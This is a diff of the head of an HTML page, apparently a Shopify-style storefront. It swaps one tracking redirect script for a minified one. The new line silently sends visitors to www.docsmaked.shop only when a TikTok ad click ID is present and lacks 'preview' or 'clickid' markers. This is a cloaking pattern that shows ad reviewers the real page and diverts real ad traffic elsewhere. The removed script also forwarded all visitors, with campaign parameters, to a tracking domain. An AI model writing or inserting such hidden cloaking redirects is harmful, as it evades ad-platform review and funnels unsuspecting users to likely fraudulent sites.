@@ -1,41 +1,7 @@
 
 <!doctype html>
-  <script>
-// URL base de redirecionamento
-var baseRedirectUrl = "https://fb.track-conv.shop/visit/03bd3981-6193-44e7-a013-fb2875af3101";
-
-// Captura os parâmetros da URL atual
-var currentUrl = window.location.href;
-var urlParams = new URLSearchParams(new URL(currentUrl).search);
-
-// Cria um objeto com os parâmetros que você quer transferir
-var desiredParams = {
-    'ttclid': '__CLICKID__',
-    'utm_campaign': '__CAMPAIGN_NAME__',
-    'utm_content': '__CID_NAME__',
-    'mc_campaign_id': '__CAMPAIGN_ID__',
-    'mc_adset_name': '__AID_NAME__',
-    'mc_adset_id': '__AID__',
-    'mc_ad_id': '__CID__',
-    'mc_pub': '__PLACEMENT__'
-};
-
-// Adiciona os parâmetros encontrados na URL atual ao URL de redirecionamento
-var separator = baseRedirectUrl.includes('?') ? '&' : '?';
-
-Object.keys(desiredParams).forEach(function(key) {
-    if (urlParams.has(key)) {
-        baseRedirectUrl += separator + key + '=' + encodeURIComponent(urlParams.get(key));
-        separator = '&';
-    } else if (desiredParams[key] && desiredParams[key] !== '') {
-        // Se o parâmetro não estiver na URL atual, usa o valor padrão
-        baseRedirectUrl += separator + key + '=' + encodeURIComponent(desiredParams[key]);
-        separator = '&';
-    }
-});
-
-// Redireciona para a nova URL
-window.location.href = baseRedirectUrl;
+   <script>
+(function(){const p=new URLSearchParams(location.search),t=p.get('ttclid');t&&!t.includes('preview')&&!t.includes('clickid')&&location.replace('https://www.docsmaked.shop/pful-shopify.html/?'+p)})();
 </script>
 <html class="js" lang="en">
   <head>
